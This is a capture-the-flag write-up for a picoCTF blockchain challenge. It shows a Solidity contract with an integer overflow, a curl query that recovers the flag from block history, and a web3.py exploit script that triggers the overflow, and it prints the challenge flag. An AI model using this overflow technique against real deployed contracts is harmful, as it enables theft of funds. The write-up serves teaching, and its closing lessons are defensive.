# smart-overflow — picoCTF 2026

**Category:** Blockchain
**Flag:** `picoCTF{Sm4r7_OverFL0ws_ExI5t_abeec303}`
**Contract:** `IntOverflowBank.sol`
**Ethereum Node:** `mysterious-sea.picoctf.net:51342`

---

## Overview

A Solidity `^0.6.12` contract with no SafeMath — arithmetic silently wraps on overflow. There are actually **two paths** to the flag:

1. **Forensic:** Read the flag directly from blockchain transaction history (everything is public).
2. **Intended exploit:** Trigger the integer overflow to reveal the flag via contract event.

---

## Contract Analysis

```solidity
pragma solidity ^0.6.12;

contract IntOverflowBank {
    mapping(address => uint256) public balances;
    string private flag;
    bool public revealed;

    function deposit(uint256 amount) external {
        balances[msg.sender] = balances[msg.sender] + amount;

        if (!revealed && balances[msg.sender] < amount) {
            revealed = true;
            emit FlagRevealed(flag);
        }
    }

    function getFlag() external view returns (string memory) {
        require(revealed, "Flag not revealed yet");
        return flag;
    }
}
```

### Key Observations

1. **Solidity 0.6.12** — no default overflow protection (added in 0.8.x). `uint256` arithmetic wraps silently.
2. **Overflow trigger:** After `balances[msg.sender] = balances[msg.sender] + amount`, if the addition overflowed (wrapped to a small value), then `balances[msg.sender] < amount` is `true` → `revealed = true`.
3. **`deposit()` takes a `uint256 amount` with no `msg.value` requirement** — the balance is purely accounting, not backed by ETH. Any `uint256` value can be deposited for free.
4. **`flag` is `private`** — but `private` only restricts other *contracts* from reading storage. The raw storage is always readable on-chain, and the `setFlag` transaction input is permanently recorded in block history.

---

## Path 1: Forensic — Reading from Transaction History

Everything written to a blockchain is public and permanent, including transaction input data. The owner called `setFlag(flag)` during setup — that call is stored in block 2.

```bash
curl -s -X POST http://mysterious-sea.picoctf.net:51342/ \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["0x2",true],"id":1}'
```

Block 2 contains a `setFlag` transaction. The input hex decodes directly to the flag:

```bash
python3 -c "print(bytes.fromhex(
  '7069636f4354467b536d3472375f4f766572464c3077735f45784935745f61626565633330337d'
).decode())"
# picoCTF{Sm4r7_OverFL0ws_ExI5t_abeec303}
```

---

## Path 2: Intended Exploit — Integer Overflow

In Solidity < 0.8.0:
```
(2^256 - 1) + 1 = 0   (mod 2^256)
```

**Step 1:** Call `deposit(2**256 - 1)`
- `balances[attacker]` = `0xFFFF...FFFF`
- Check: `(2^256-1) < (2^256-1)` → `false` — flag not revealed yet.

**Step 2:** Call `deposit(1)`
- Addition overflows to `0`
- Check: `0 < 1` → `true` → `revealed = true`, `FlagRevealed(flag)` emitted!

**Step 3:** Call `getFlag()` — returns the flag.

### Exploit Script

```python
from web3 import Web3

RPC_URL = "http://mysterious-sea.picoctf.net:51342"
CONTRACT_ADDRESS = "0x6d8da4b12d658a36909ec1c75f81e54b8db4ebf9"

ABI = [
    {"name": "deposit",  "type": "function", "inputs": [{"name": "amount", "type": "uint256"}], "outputs": []},
    {"name": "getFlag",  "type": "function", "inputs": [], "outputs": [{"name": "", "type": "string"}]},
    {"name": "revealed", "type": "function", "inputs": [], "outputs": [{"name": "", "type": "bool"}]},
]

w3 = Web3(Web3.HTTPProvider(RPC_URL))
contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)
attacker = w3.eth.accounts[1]
MAX_UINT256 = 2**256 - 1

tx1 = contract.functions.deposit(MAX_UINT256).transact({"from": attacker})
w3.eth.wait_for_transaction_receipt(tx1)

tx2 = contract.functions.deposit(1).transact({"from": attacker})
w3.eth.wait_for_transaction_receipt(tx2)
print(f"Revealed: {contract.functions.revealed().call()}")

flag = contract.functions.getFlag().call({"from": attacker})
print(f"Flag: {flag}")
```

---

## Key Lessons

1. **`private` does not mean secret on-chain.** Any data written to the blockchain — including function call inputs — is permanently public.
2. **Solidity < 0.8.0 has no built-in overflow protection.** Always use `SafeMath` or upgrade to Solidity ≥ 0.8.0.
3. **Blockchain state is forensically rich.** Even without triggering the exploit, the flag was recoverable from transaction history.
